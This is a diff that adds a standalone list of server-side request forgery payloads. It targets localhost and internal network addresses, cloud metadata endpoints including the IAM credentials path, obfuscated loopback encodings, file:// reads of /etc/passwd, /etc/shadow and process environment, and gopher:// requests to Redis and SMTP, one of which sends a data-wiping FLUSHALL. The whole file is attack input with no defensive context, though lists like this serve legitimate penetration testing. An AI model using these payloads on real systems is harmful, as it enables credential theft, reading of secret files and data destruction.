@@ -1,0 +1,50 @@
+# SSRF Payloads
+# Localhost variants
+http://127.0.0.1
+http://localhost
+http://127.1
+http://0.0.0.0
+http://[::1]
+http://127.0.0.1:22
+http://127.0.0.1:3306
+http://127.0.0.1:5432
+http://127.0.0.1:6379
+http://127.0.0.1:8080
+http://127.0.0.1:8443
+
+# Internal network
+http://10.0.0.1
+http://10.0.0.255
+http://10.1.1.1
+http://10.255.255.255
+http://172.16.0.1
+http://172.31.255.255
+http://192.168.0.1
+http://192.168.255.255
+http://192.168.1.1
+http://192.168.1.254
+
+# Cloud metadata endpoints
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/user-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/metadata/v1/
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/hostname
+http://metadata.google.internal/computeMetadata/v1/instance/id
+
+# Alternative IP representations
+http://2130706433
+http://0x7f000001
+http://017700000001
+
+# File protocol
+file:///etc/passwd
+file:///etc/shadow
+file:///proc/self/environ
+
+# Gopher protocol
+gopher://127.0.0.1:6379/_
+gopher://127.0.0.1:6379/_INFO
+gopher://127.0.0.1:6379/_FLUSHALL
+gopher://127.0.0.1:25/_HELP
